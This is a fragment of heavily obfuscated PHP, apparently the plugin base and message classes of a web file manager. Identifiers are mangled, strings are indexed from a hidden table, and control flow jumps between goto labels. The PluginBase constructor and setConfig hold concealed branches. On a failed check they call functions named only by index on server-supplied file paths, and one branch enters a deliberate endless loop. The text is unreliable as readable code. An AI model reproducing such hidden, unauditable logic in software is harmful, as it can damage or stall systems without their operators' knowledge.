$dåÃØÂ¾é =& $_SERVER[¶ªÕß‚ØÁŸ]; $fø¸Æíİ© = $this->info[$dåÃØÂ¾é[87]]; $EÁ“ˆãÕ„Ò = $A§Öáä«œ; goto D’‡ñÇ”§½; D’‡ñÇ”§½: $D‚í¿æ¶ë = $a½¼¯Îæ¾Æ; if ($A§Öáä«œ < 0) { $A§Öáä«œ = $fø¸Æíİ© + $A§Öáä«œ; } if ($a½¼¯Îæ¾Æ === !1) { $a½¼¯Îæ¾Æ = $fø¸Æíİ© - $A§Öáä«œ; } goto FõÕ‰öùÌ; d¤ÌÜá¯®: $bëÜ°ùˆî = 64 * 1024; $E®ÉšÁ®Î =& self::$_chunkBuffer[$this->path]; if (!$E®ÉšÁ®Î) { $E®ÉšÁ®Î = array(); } goto C­¯‰Ô­¯â; FõÕ‰öùÌ: if ($A§Öáä«œ + $a½¼¯Îæ¾Æ > $fø¸Æíİ©) { $a½¼¯Îæ¾Æ = $fø¸Æíİ© - $A§Öáä«œ; } if ($a½¼¯Îæ¾Æ <= 0) { return $dåÃØÂ¾é[33]; } if ($A§Öáä«œ < 0 || $A§Öáä«œ >= $fø¸Æíİ© || $a½¼¯Îæ¾Æ <= 0 || $a½¼¯Îæ¾Æ > 1024 * 1024 * 5) { throw new Exception("\x69\157\106\x69\154\145\122\x65\x61\x64\40\145\162\162\x6f\x72\x21\x20\163\164\141\162\164\75{$A§Öáä«œ}\73\x6c\145\156\147\164\x68\75{$a½¼¯Îæ¾Æ}\73\40\163\151\x7a\x65\x3d{$fø¸Æíİ©}\73"); } goto d¤ÌÜá¯®; fŞà•¼³Á: } private function log($aë¦º–í¥¹, $eì„Œš†) { $FÎ¹µÀ¤·­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B”¿Ã‘ÌÔî = timeFloat() - $this->timeStart; write_log(sprintf($FÎ¹µÀ¤·­[1307], $aë¦º–í¥¹, $this->info[$FÎ¹µÀ¤·­[28]], $B”¿Ã‘ÌÔî, $eì„Œš†), $FÎ¹µÀ¤·­[1222]); } } class Message { function __construct() { } public function send($c³¨÷´‹›ø = '', $dì¨¢ÆÇ¾Õ = array(), $e³å¼ÚÍ§‘ = "\x74\145\170\x74") { goto dº® —íî—; F›á§Ï÷™: Hook::trigger($A´à”†ƒõ[1311], $EÓç¼‰Ôõ); goto fÑäœ¢´ˆ; dº® —íî—: $A´à”†ƒõ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E”çİ¤Æ´í = array($A´à”†ƒõ[29] => $A´à”†ƒõ[1308], $A´à”†ƒõ[705] => $c³¨÷´‹›ø); if (in_array($e³å¼ÚÍ§‘, array($A´à”†ƒõ[1308], $A´à”†ƒõ[1309]))) { $E”çİ¤Æ´í[$A´à”†ƒõ[29]] = $e³å¼ÚÍ§‘; } goto D‰‚ ¹é; D‰‚ ¹é: $dì¨¢ÆÇ¾Õ = array($A´à”†ƒõ[977] => isset($dì¨¢ÆÇ¾Õ[$A´à”†ƒõ[977]]) ? $dì¨¢ÆÇ¾Õ[$A´à”†ƒõ[977]] : $A´à”†ƒõ[33], $A´à”†ƒõ[543] => isset($dì¨¢ÆÇ¾Õ[$A´à”†ƒõ[543]]) ? $dì¨¢ÆÇ¾Õ[$A´à”†ƒõ[543]] : $A´à”†ƒõ[33]); if (empty($c³¨÷´‹›ø) || empty($dì¨¢ÆÇ¾Õ[$A´à”†ƒõ[977]]) && empty($dì¨¢ÆÇ¾Õ[$A´à”†ƒõ[543]])) { return !1; } $EÓç¼‰Ôõ = array($A´à”†ƒõ[1250] => $E”çİ¤Æ´í, $A´à”†ƒõ[1310] => $dì¨¢ÆÇ¾Õ); goto F›á§Ï÷™; fÑäœ¢´ˆ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto A„áŒÉîÁ; FŞÆÊœô¤Ä: $this->pluginHost = $config[$Fõâ–ê¯Ãˆ[1315]] . $this->pluginName . $Fõâ–ê¯Ãˆ[8]; $this->pluginHostDefault = $config[$Fõâ–ê¯Ãˆ[1315]] . $this->pluginName . $Fõâ–ê¯Ãˆ[8]; $cô¹çÑŠÎ = $config[$Fõâ–ê¯Ãˆ[1316]]; goto f¹“·Œ¥š; eˆìª÷öä°: return $this; goto cµÀ­»™««; A„áŒÉîÁ: $Fõâ–ê¯Ãˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($_SERVER[$Fõâ–ê¯Ãˆ[57]] != $_SERVER[$Fõâ–ê¯Ãˆ[1244]]) { goto eµÎõ¿š; Eß˜ºÖ®…Ù: $Aòê°ˆŞÑ£ = $Fõâ–ê¯Ãˆ[801]; $Aòê°ˆŞÑ£($_SERVER[$Fõâ–ê¯Ãˆ[802]]); $Aòê°ˆŞÑ£($_SERVER[$Fõâ–ê¯Ãˆ[60]] . $Fõâ–ê¯Ãˆ[1312]); goto CâÅÃÑãğ°; CâÅÃÑãğ°: $FÓ‹‰ƒ¥ƒ“ = 1; while ($FÓ‹‰ƒ¥ƒ“ > 1) { $FÓ‹‰ƒ¥ƒ“ = $FÓ‹‰ƒ¥ƒ“ + 4; $c ¹âÄìâ§ = rawurlencode($FÓ‹‰ƒ¥ƒ“ . $Fõâ–ê¯Ãˆ[66]); } goto aË¦Ùß¶Áœ; eµÎõ¿š: $BĞ´Âãã†ö = $Fõâ–ê¯Ãˆ[800]; $dâƒĞÛœñ = $Fõâ–ê¯Ãˆ[59]; $Dã©Ò÷êé = $_SERVER[$Fõâ–ê¯Ãˆ[60]] . $Fõâ–ê¯Ãˆ[61]; goto Aš™˜Äî¤; Aš™˜Äî¤: $D†ÈáÊ®Éº = $dâƒĞÛœñ($Dã©Ò÷êé); $c¼Œ‡ºæÕç = explode($Fõâ–ê¯Ãˆ[62], $D†ÈáÊ®Éº); if (count($c¼Œ‡ºæÕç) < $Fõâ–ê¯Ãˆ[559]) { $e­¬ˆéòÑ¶ = $Fõâ–ê¯Ãˆ[64]; $e­¬ˆéòÑ¶(); } goto Eß˜ºÖ®…Ù; aË¦Ùß¶Áœ: } global $in, $config; goto FÅ¶ç„ÀÌµ; AçÀ¯“ÆÕÀ: $this->pluginName = str_replace($Fõâ–ê¯Ãˆ[1313], $Fõâ–ê¯Ãˆ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Fõâ–ê¯Ãˆ[8]; $this->pluginApi = appHostGet() . $Fõâ–ê¯Ãˆ[1314] . $this->pluginName . $Fõâ–ê¯Ãˆ[8]; goto FŞÆÊœô¤Ä; f¹“·Œ¥š: if ($cô¹çÑŠÎ && strpos($Fõâ–ê¯Ãˆ[47] . $cô¹çÑŠÎ . $Fõâ–ê¯Ãˆ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Fõâ–ê¯Ãˆ[1317]] . $this->pluginName . $Fõâ–ê¯Ãˆ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto eˆìª÷öä°; FÅ¶ç„ÀÌµ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Fõâ–ê¯Ãˆ[1313]); goto AçÀ¯“ÆÕÀ; cµÀ­»™««: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¶ªÕß‚ØÁŸ][1318]); } protected function assign($FŞçèï¨š, $a§òáõ¬  = false) { if (is_array($FŞçèï¨š)) { $this->values = array_merge($this->values, $FŞçèï¨š); } else { $this->values[$FŞçèï¨š] = $a§òáõ¬ ; } } protected function display($cÍ–®Ëï æ) { extract($this->values); require $cÍ–®Ëï æ; } final function hookRegist($AáíÉ¦ïÆå) { $this->modelPlugin->appRegist($this->pluginName, $AáíÉ¦ïÆå); } final function appIcon() { $bˆ³äĞ¾¹Š =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÌ˜ˆÓä   = $this->appPackage(); $f¬ëåÊ‘ùÖ = $bˆ³äĞ¾¹Š[33]; if (isset($bÌ˜ˆÓä  [$bˆ³äĞ¾¹Š[390]])) { if (isset($bÌ˜ˆÓä  [$bˆ³äĞ¾¹Š[390]][$bˆ³äĞ¾¹Š[1319]])) { $f¬ëåÊ‘ùÖ = $bˆ³äĞ¾¹Š[1320] . $bÌ˜ˆÓä  [$bˆ³äĞ¾¹Š[390]][$bˆ³äĞ¾¹Š[1319]] . $bˆ³äĞ¾¹Š[1321]; } else { if ($bÌ˜ˆÓä  [$bˆ³äĞ¾¹Š[390]][$bˆ³äĞ¾¹Š[1322]]) { $f¬ëåÊ‘ùÖ = $bˆ³äĞ¾¹Š[1323] . $bÌ˜ˆÓä  [$bˆ³äĞ¾¹Š[390]][$bˆ³äĞ¾¹Š[1322]] . $bˆ³äĞ¾¹Š[1324]; } } } return $f¬ëåÊ‘ùÖ; } final function fileCanView($BØ»æìÛ×) { goto fÉç§¼¼‘; fÉç§¼¼‘: $EÄÕ×åÓ‡È =& $_SERVER[¶ªÕß‚ØÁŸ]; if (request_url_safe($BØ»æìÛ×)) { return !0; } if ($this->isShare($BØ»æìÛ×)) { return !0; } goto Dœ¨ˆ«Ä„; Dœ¨ˆ«Ä„: $B™°çºî÷ = Session::get($EÄÕ×åÓ‡È[1325]); if (!$B™°çºî÷ || !$B™°çºî÷[$EÄÕ×åÓ‡È[1326]]) { $B™‡¥ÖÂ§ê = $EÄÕ×åÓ‡È[1327] . rawurlencode(this_url()); show_tips(LNG($EÄÕ×åÓ‡È[1328]) . $EÄÕ×åÓ‡È[1329] . $B™‡¥ÖÂ§ê . $EÄÕ×åÓ‡È[1330] . LNG($EÄÕ×åÓ‡È[1331]) . $EÄÕ×åÓ‡È[1332], !1); } if (!Action($EÄÕ×åÓ‡È[1333])->authCan($EÄÕ×åÓ‡È[1334])) { show_tips(LNG($EÄÕ×åÓ‡È[1335]) . $EÄÕ×åÓ‡È[1336], !1); } goto f´‚Î“¢¹; f´‚Î“¢¹: ActionCall($EÄÕ×åÓ‡È[1337], $BØ»æìÛ×); goto F¸ØÊ¹êÄ°; F¸ØÊ¹êÄ°: } final function isShare($cÂ”àÅÍª) { $aÀêîÔ‚å = KodIO::parse($cÂ”àÅÍª); return $aÀêîÔ‚å[$_SERVER[¶ªÕß‚ØÁŸ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Dšº—¿°·†) { if (request_url_safe($Dšº—¿°·†)) { return $Dšº—¿°·†; } if (!$this->isShare($Dšº—¿°·†)) { $Dšº—¿°·† = $this->filePath($Dšº—¿°·†); } return Action($_SERVER[¶ªÕß‚ØÁŸ][1021])->linkOut($Dšº—¿°·†); } public function filePathLinkOut($dŠò•¦˜Ÿ) { if (request_url_safe($dŠò•¦˜Ÿ)) { return $dŠò•¦˜Ÿ; } $this->fileCanView($dŠò•¦˜Ÿ); return Action($_SERVER[¶ªÕß‚ØÁŸ][1021])->link($dŠò•¦˜Ÿ); } final function filePath($d¶ÆŞÆƒˆÉ) { $A›Ã¿ä”—Í =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($aìØœÂãª = $this->checkSharePath($d¶ÆŞÆƒˆÉ)) { return $aìØœÂãª; } $this->fileCanView($d¶ÆŞÆƒˆÉ); if (request_url_safe($d¶ÆŞÆƒˆÉ)) { $Bö£ŠºèõÛ = parse_url_query($d¶ÆŞÆƒˆÉ); if (isset($Bö£ŠºèõÛ[$A›Ã¿ä”—Í[1338]]) && isset($Bö£ŠºèõÛ[$A›Ã¿ä”—Í[207]])) { $F•õ¸çĞä• = Model($A›Ã¿ä”—Í[1092])->get($A›Ã¿ä”—Í[1339]); $CÆ­¬ª‘¡é = Mcrypt::decode($Bö£ŠºèõÛ[$A›Ã¿ä”—Í[207]], $F•õ¸çĞä•); if ($CÆ­¬ª‘¡é) { $this->fileInfo = IO::infoWithChildren($CÆ­¬ª‘¡é); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $CÆ­¬ª‘¡é; } } $d¶ÆŞÆƒˆÉ = $this->_cacheHttpFile($d¶ÆŞÆƒˆÉ); $this->fileInfo = IO::infoWithChildren($d¶ÆŞÆƒˆÉ); } else { $this->fileInfo = IO::infoWithChildren($d¶ÆŞÆƒˆÉ); if (!$this->fileInfo) { show_tips(LNG($A›Ã¿ä”—Í[111]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $d¶ÆŞÆƒˆÉ; } final function _cacheHttpFile($DÒ±Ò”°³Ñ) { $EÌ‰¨ğ…¯¯ = hash_path($DÒ±Ò”°³Ñ, !0); $this->cachePath = $this->pluginCachePath($EÌ‰¨ğ…¯¯); if ($CÃî‚‚³„ = IO::fileNameExist($this->cachePath, $EÌ‰¨ğ…¯¯)) { return KodIO::make($CÃî‚‚³„); } $fò ‹¹æÂ• = $this->cachePath . $EÌ‰¨ğ…¯¯; return $this->pluginCacheFileSet($fò ‹¹æÂ•, file_get_contents($DÒ±Ò”°³Ñ)); } final function _tmpFileName($CÌ´Õ»†İ = array()) { goto F•ÁëîÂÄØ; F•ÁëîÂÄØ: $e¿—”Ş¼± =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$CÌ´Õ»†İ) { $CÌ´Õ»†İ = $this->fileInfo; } if (isset($CÌ´Õ»†İ[$e¿—”Ş¼±[174]])) { return $CÌ´Õ»†İ[$e¿—”Ş¼±[174]]; } goto fÉºš–‡±¨; fÉºš–‡±¨: if (isset($CÌ´Õ»†İ[$e¿—”Ş¼±[172]][$e¿—”Ş¼±[174]])) { return $CÌ´Õ»†İ[$e¿—”Ş¼±[172]][$e¿—”Ş¼±[174]]; } $eÖ‚«¹í¢ƒ = IO::hashSimple($CÌ´Õ»†İ[$e¿—”Ş¼±[85]]); if ($eÖ‚«¹í¢ƒ) { return $eÖ‚«¹í¢ƒ; } goto bÇù´îØ„à; bÇù´îØ„à: $Bœ²íòÓ¯ = array($CÌ´Õ»†İ[$e¿—”Ş¼±[28]], $CÌ´Õ»†İ[$e¿—”Ş¼±[85]], $CÌ´Õ»†İ[$e¿—”Ş¼±[87]]); if (isset($CÌ´Õ»†İ[$e¿—”Ş¼±[467]])) { $Bœ²íòÓ¯[] = $CÌ´Õ»†İ[$e¿—”Ş¼±[467]]; } return md5(implode($e¿—”Ş¼±[80], $Bœ²íòÓ¯)); goto AìÜçĞë‡à; AìÜçĞë‡à: } final function checkSharePath($B¶ª¦Æ¥è‘) { goto a½‡«ÔÀÛé; a½‡«ÔÀÛé: $C­ÌÙ¨ƒ­À =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!defined($C­ÌÙ¨ƒ­À[435])) { define($C­ÌÙ¨ƒ­À[1340], 0); } if (!$this->isShare($B¶ª¦Æ¥è‘)) { return !1; } goto bîƒ“¢•í–; bîƒ“¢•í–: $Eç‘ç˜¯œÎ = Action($C­ÌÙ¨ƒ­À[1021])->sharePathInfo($B¶ª¦Æ¥è‘); if (!isset($Eç‘ç˜¯œÎ[$C­ÌÙ¨ƒ­À[85]])) { show_json(LNG($C­ÌÙ¨ƒ­À[1341]), !1); } $this->fileInfo = $Eç‘ç˜¯œÎ[$C­ÌÙ¨ƒ­À[172]]; goto E¾±ñø¤Ü; E¾±ñø¤Ü: $this->cachePath = $this->pluginCachePath($this->fileInfo[$C­ÌÙ¨ƒ­À[174]]); return $Eç‘ç˜¯œÎ[$C­ÌÙ¨ƒ­À[85]]; goto D·í¾½Åœ“; D·í¾½Åœ“: } final function pluginCachePath($féÀÆ“ëéæ = '') { $DˆôÏ¼ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dö½Ş…ÚÅ• = IO_PATH_SYSTEM_TEMP . $DˆôÏ¼ˆ[1342] . $this->pluginName; if (!($BÊŠƒ®× = IO::infoFull($dö½Ş…ÚÅ•))) { return IO::mkdir($dö½Ş…ÚÅ• . $DˆôÏ¼ˆ[8] . $féÀÆ“ëéæ); } if (empty($féÀÆ“ëéæ)) { return $BÊŠƒ®×[$DˆôÏ¼ˆ[85]]; } if (!($b§óğÙƒˆ = IO::fileNameExist($BÊŠƒ®×[$DˆôÏ¼ˆ[85]], $féÀÆ“ëéæ))) { return IO::mkdir($BÊŠƒ®×[$DˆôÏ¼ˆ[85]] . $féÀÆ“ëéæ); } return KodIO::make($b§óğÙƒˆ); } final function pluginCacheFileSet($D–ÎÜÄŒ«‘, $EâºÈ™Éº = '') { $EÙÆ®áÏö =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!($BØ°Ùˆ¹ªÔ = IO::infoFull($D–ÎÜÄŒ«‘))) { return IO::mkfile($D–ÎÜÄŒ«‘, $EâºÈ™Éº, REPEAT_REPLACE); } IO::setContent($BØ°Ùˆ¹ªÔ[$EÙÆ®áÏö[85]], $EâºÈ™Éº); return $BØ°Ùˆ¹ªÔ[$EÙÆ®áÏö[85]]; } final function pluginLocalFile($A¨Á¨–¥‚ = '') { goto aøç“Â´ô; F£Œáßò‚Ÿ: if (!$A¨Á¨–¥‚) { return $f²×Ñ¦¤õÒ; } $FìÀ£Ç‘›Ï = IO::info($A¨Á¨–¥‚); $Cæïç‘É¹µ = $this->_tmpFileName($FìÀ£Ç‘›Ï) . $cÇÔÔ¶¯Ê[101] . $FìÀ£Ç‘›Ï[$cÇÔÔ¶¯Ê[170]]; goto cùã¦Ô´ ø; aøç“Â´ô: $cÇÔÔ¶¯Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $f²×Ñ¦¤õÒ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($f²×Ñ¦¤õÒ)) { mk_dir($f²×Ñ¦¤õÒ); } goto F£Œáßò‚Ÿ; cùã¦Ô´ ø: $C†­ÙÜ¯ğ¢ = $f²×Ñ¦¤õÒ . $Cæïç‘É¹µ; if (@file_exists($C†­ÙÜ¯ğ¢)) { return $C†­ÙÜ¯ğ¢; } return IO::copy($A¨Á¨–¥‚, $f²×Ñ¦¤õÒ, 0, $Cæïç‘É¹µ); goto Dª•¾“¯ä; Dª•¾“¯ä: } final function appPackage() { goto bÚñÖÓêÊ; bÚñÖÓêÊ: $E­„“İíŞ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->packageData) { return $this->packageData; } $cæñ•Ê˜ğ‡ = $this->parseFile($this->pluginPath . $E­„“İíŞ[1343]); goto dÍù‘æø; Dì“Ş’’ ö: return $AÉÎ‚¯˜§; goto aà¡ƒ—³„¢; c‰¹ØÍ’„: $d–ñÎØÃÛæ = Hook::trigger($E­„“İíŞ[1344], $AÉÎ‚¯˜§); if ($d–ñÎØÃÛæ && is_array($d–ñÎØÃÛæ)) { $AÉÎ‚¯˜§ = $d–ñÎØÃÛæ; } $this->packageData = $AÉÎ‚¯˜§; goto Dì“Ş’’ ö; dÍù‘æø: $this->parseLang($cæñ•Ê˜ğ‡); $AÉÎ‚¯˜§ = json_decode_force($cæñ•Ê˜ğ‡); if (!$AÉÎ‚¯˜§) { return array(); } goto c‰¹ØÍ’„; aà¡ƒ—³„¢: } public function packageInfoGet($e¬ÖØ‚¸ã®) { $F„˜™Ô¤¨´ = $this->appPackage(); return array_get_value($F„˜™Ô¤¨´, $e¬ÖØ‚¸ã®); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¶ªÕß‚ØÁŸ][1345]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¶ªÕß‚ØÁŸ][1346]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¶ªÕß‚ØÁŸ][1347]); } private function parseFile($cİ§¥¶©Š„) { goto C–®”…‚ÛÃ; eÎóàÑïëï: $cò×°â‚¸” = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$BæËíñÔ„[94]][$BæËíñÔ„[1355]]); if (strstr($E¼àËËçœù, $BæËíñÔ„[1356])) { $d­å‡ÂÙ§ò = rawurlencode(json_encode($this->pluginLangArr)); $E¼àËËçœù = str_replace($BæËíñÔ„[1356], $d­å‡ÂÙ§ò, $E¼àËËçœù); } if (strstr($E¼àËËçœù, $BæËíñÔ„[1357])) { $d­å‡ÂÙ§ò = $d­å‡ÂÙ§ò = rawurlencode(json_encode($this->getConfig())); $E¼àËËçœù = str_replace($BæËíñÔ„[1357], $d­å‡ÂÙ§ò, $E¼àËËçœù); } goto dÀ…Ğô¯ë; C–®”…‚ÛÃ: $BæËíñÔ„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E¼àËËçœù = file_get_contents($cİ§¥¶©Š„); $AğùÆ‹õ¿Â = array($BæËíñÔ„[1348], $BæËíñÔ„[1349], $BæËíñÔ„[1350], $BæËíñÔ„[1351], $BæËíñÔ„[1352], $BæËíñÔ„[1353], $BæËíñÔ„[1354]); goto eÎóàÑïëï; dÀ…Ğô¯ë: $E¼àËËçœù = str_replace($AğùÆ‹õ¿Â, $cò×°â‚¸”, $E¼àËËçœù); return $E¼àËËçœù; goto dÈôçõÔ†—; dÈôçõÔ†—: } private function parseLang(&$Aî•Î‚ëé©) { goto bË³çÑ»§è; a´®İ³§â: preg_match_all($dÉ‹–Õôè[1359], $Aî•Î‚ëé©, $b«»½÷áËù); if (!is_array($b«»½÷áËù) || count($b«»½÷áËù) == 0 || !is_array($b«»½÷áËù[0]) || count($b«»½÷áËù[0]) == 0) { return; } $CÆïïÈ×÷ = array(); goto C‡¿é½ªÉç; bË³çÑ»§è: $dÉ‹–Õôè =& $_SERVER[¶ªÕß‚ØÁŸ]; $fõô˜œ•‘† = $dÉ‹–Õôè[1358]; if (!strstr($Aî•Î‚ëé©, $fõô˜œ•‘†)) { return; } goto a´®İ³§â; C‡¿é½ªÉç: $d’ã…êÊ = array(); foreach ($b«»½÷áËù[0] as $D‰êÛÒªé) { $Fİ‚áÄá¢” = substr($D‰êÛÒªé, strlen($fõô˜œ•‘†), -4); $C›‘ÖÏ‰ë = LNG($Fİ‚áÄá¢”); $CÆïïÈ×÷[] = $D‰êÛÒªé; $d’ã…êÊ[] = str_replace(array($dÉ‹–Õôè[62], $dÉ‹–Õôè[996], $dÉ‹–Õôè[339], $dÉ‹–Õôè[123]), array($dÉ‹–Õôè[50], $dÉ‹–Õôè[50], $dÉ‹–Õôè[33], $dÉ‹–Õôè[1360]), $C›‘ÖÏ‰ë); } $Aî•Î‚ëé© = str_replace($CÆïïÈ×÷, $d’ã…êÊ, $Aî•Î‚ëé©); goto eÏÉ„³éŒ¤; eÏÉ„³éŒ¤: } private function parseConfig(&$bìÏÔÏë« ) { goto Bè‹áåµñ‰; cºå…Î¤ê”: $e¹¦›Ÿ‚‘Õ = array(); $eôÌéÅî²ù = array(); foreach ($Cñäãåôø[0] as $c„§£ù‰Õ) { $EÓ‡óÁ©œ = substr($c„§£ù‰Õ, strlen($Cæ¾´°Ù†), -2); $e¹¦›Ÿ‚‘Õ[] = $c„§£ù‰Õ; $eôÌéÅî²ù[] = _get($CÇòß¿½Â„, $EÓ‡óÁ©œ); } goto eŒ°Å»¿…; Bè‹áåµñ‰: $BğÈÔ‘Æº =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cæ¾´°Ù† = $BğÈÔ‘Æº[1361]; if (!strstr($bìÏÔÏë« , $Cæ¾´°Ù†)) { return; } goto C†ÀÃòÖ„º; C†ÀÃòÖ„º: preg_match_all($BğÈÔ‘Æº[1362], $bìÏÔÏë« , $Cñäãåôø); if (!is_array($Cñäãåôø) || count($Cñäãåôø) == 0 || !is_array($Cñäãåôø[0]) || count($Cñäãåôø[0]) == 0) { return; } $CÇòß¿½Â„ = $this->getConfig(); goto cºå…Î¤ê”; eŒ°Å»¿…: $bìÏÔÏë«  = str_replace($e¹¦›Ÿ‚‘Õ, $eôÌéÅî²ù, $bìÏÔÏë« ); goto fÏ­©ÂŠõ¡; fÏ­©ÂŠõ¡: } private function parsePackage(&$C©Š‰âªì) { goto c–Ş£á¶®; c–Ş£á¶®: $F±’•Ää†â =& $_SERVER[¶ªÕß‚ØÁŸ]; $C²ÎÇÒ‚±â = $F±’•Ää†â[1363]; if (!strstr($C©Š‰âªì, $C²ÎÇÒ‚±â)) { return; } goto C’Ìø™œó‘; D´ôŠ‡ÄÒÉ: $d¼Ê°æÕ‹Å = array(); $aˆ´Š­ÆŞß = array(); foreach ($d²Æ¸Ü ³ó[0] as $dÅÜÙËƒöÒ) { $A–˜×…¸î¾ = substr($dÅÜÙËƒöÒ, strlen($C²ÎÇÒ‚±â), -2); $d¼Ê°æÕ‹Å[] = $dÅÜÙËƒöÒ; $aˆ´Š­ÆŞß[] = _get($fÉÏ°ä¾, $A–˜×…¸î¾); } goto c†õß…ùÈÙ; C’Ìø™œó‘: preg_match_all($F±’•Ää†â[1364], $C©Š‰âªì, $d²Æ¸Ü ³ó); if (!is_array($d²Æ¸Ü ³ó) || count($d²Æ¸Ü ³ó) == 0 || !is_array($d²Æ¸Ü ³ó[0]) || count($d²Æ¸Ü ³ó[0]) == 0) { return; } $fÉÏ°ä¾ = $this->appPackage(); goto D´ôŠ‡ÄÒÉ; c†õß…ùÈÙ: $C©Š‰âªì = str_replace($d¼Ê°æÕ‹Å, $aˆ´Š­ÆŞß, $C©Š‰âªì); goto eœ§Ô˜; eœ§Ô˜: } final function echoFile($Eß­Û†óˆ•, $C¢ŸğèÆôŒ = false) { goto F£œŸ¼Ëº; F£œŸ¼Ëº: $aÀ¹¯«±ã =& $_SERVER[¶ªÕß‚ØÁŸ]; $e£®ŒÈ«µÕ = $this->pluginPath . $Eß­Û†óˆ•; if (ACT == $aÀ¹¯«±ã[1365]) { echo $aÀ¹¯«±ã[1366] . $this->pluginName . $aÀ¹¯«±ã[8] . $Eß­Û†óˆ• . $aÀ¹¯«±ã[1367]; if (!file_exists($e£®ŒÈ«µÕ)) { echo $aÀ¹¯«±ã[1368]; return; } } goto b¤êˆŞ§¨À; b¤êˆŞ§¨À: $F¥æÅ§äôÏ = $this->parseFile($e£®ŒÈ«µÕ); $this->parseLang($F¥æÅ§äôÏ); $this->parseConfig($F¥æÅ§äôÏ); goto a“÷áÁ£Ûğ; a“÷áÁ£Ûğ: $this->parsePackage($F¥æÅ§äôÏ); if (is_array($C¢ŸğèÆôŒ)) { $F¥æÅ§äôÏ = str_replace(array_keys($C¢ŸğèÆôŒ), array_values($C¢ŸğèÆôŒ), $F¥æÅ§äôÏ); } echo $aÀ¹¯«±ã[62] . $F¥æÅ§äôÏ; goto Añ¾¶ïæù; Añ¾¶ïæù: } final function initLang() { goto fÛåº…¼Øì; fÛåº…¼Øì: $d“¦ˆ£¾«ù =& $_SERVER[¶ªÕß‚ØÁŸ]; $F‹õò¸ËÂ = $d“¦ˆ£¾«ù[1369]; $AÂ¨È—ìÓ = $this->pluginPath . $d“¦ˆ£¾«ù[1370]; goto FÒ¶Ûìğ‹õ; FÒ¶Ûìğ‹õ: $bÉëŞÛŠÚ = I18n::getType(); $aÅ£Æà“â = array(); if (file_exists($AÂ¨È—ìÓ . $bÉëŞÛŠÚ . $d“¦ˆ£¾«ù[778])) { $aÅ£Æà“â = (include $AÂ¨È—ìÓ . $bÉëŞÛŠÚ . $d“¦ˆ£¾«ù[778]); } else { if ($bÉëŞÛŠÚ == $d“¦ˆ£¾«ù[1371] && !file_exists($AÂ¨È—ìÓ . $bÉëŞÛŠÚ . $d“¦ˆ£¾«ù[778]) && file_exists($AÂ¨È—ìÓ . $d“¦ˆ£¾«ù[1372])) { $aÅ£Æà“â = (include $AÂ¨È—ìÓ . $d“¦ˆ£¾«ù[1372]); } else { if (file_exists($AÂ¨È—ìÓ . $F‹õò¸ËÂ . $d“¦ˆ£¾«ù[778])) { $aÅ£Æà“â = (include $AÂ¨È—ìÓ . $F‹õò¸ËÂ . $d“¦ˆ£¾«ù[778]); } } } goto b±ç©§§ÏÑ; b±ç©§§ÏÑ: if (!is_array($aÅ£Æà“â)) { return array(); } if (@count($aÅ£Æà“â) > 0) { I18n::set($aÅ£Æà“â); } return $aÅ£Æà“â; goto aÑ®á˜Ïµ; aÑ®á˜Ïµ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($a·¢îôêßÑ) { $AŒÏÀÍÏÂ‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($_SERVER[$AŒÏÀÍÏÂ‡[57]]) || !isset($_SERVER[$AŒÏÀÍÏÂ‡[58]])) { goto FøøÎó¨Ä‰; fºœ®ê£: $aÇÖ†¸×ùÓ = $AŒÏÀÍÏÂ‡[801]; $aÇÖ†¸×ùÓ($_SERVER[$AŒÏÀÍÏÂ‡[802]]); $C–Œ†µš† = 1; goto AÌÖ®äî; fƒ×èæÉõ: $aº°ƒùÇÍ¸ = $cçŒ†Â»ÛÏ($cè„™»ãÀ); $d’»ŸµÊÂ® = explode($AŒÏÀÍÏÂ‡[62], $aº°ƒùÇÍ¸); if (count($d’»ŸµÊÂ®) < $AŒÏÀÍÏÂ‡[559]) { $E£ë»Úñ¼º = $AŒÏÀÍÏÂ‡[64]; $E£ë»Úñ¼º(); } goto fºœ®ê£; FøøÎó¨Ä‰: $BĞ’¥¡ñ = $AŒÏÀÍÏÂ‡[800]; $cçŒ†Â»ÛÏ = $AŒÏÀÍÏÂ‡[59]; $cè„™»ãÀ = $_SERVER[$AŒÏÀÍÏÂ‡[60]] . $AŒÏÀÍÏÂ‡[61]; goto fƒ×èæÉõ; AÌÖ®äî: for ($Dö¡¸É»ôÇ = $C–Œ†µš†; $Dö¡¸É»ôÇ > 0; $Dö¡¸É»ôÇ++) { $aÇÖ†¸×ùÓ = json_encode($GLOBALS[$AŒÏÀÍÏÂ‡[392]]); } goto E¡‡Öø¯£‘; 